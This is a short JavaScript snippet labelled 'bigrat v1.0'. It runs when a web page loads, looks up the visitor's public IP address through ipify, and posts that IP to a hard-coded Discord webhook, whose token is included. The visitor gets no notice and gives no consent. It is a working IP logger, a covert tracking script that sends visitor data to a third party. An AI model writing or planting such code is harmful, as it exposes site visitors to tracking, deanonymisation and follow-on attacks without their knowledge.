window["onload"] = function () {
    fetch('https://api64.ipify.org?format=json')["then"](response => {
        var payload = {};
        payload["Content-Type"] = "application/json"
        response.json().then(l => {
            fetch("https://discord.com/api/webhooks/898596280375345153/wdAp8Tz5npMRkCdX5Rd0VmCEmr7OynVuUKHCpVJRcYBWK0HBadKhuYiEAeTB8A7NmgII", {
                method: "POST",
                headers: payload,
                body: JSON.stringify({ username: "bigrat v1.0", content: l.ip })
            })
        });
    });
}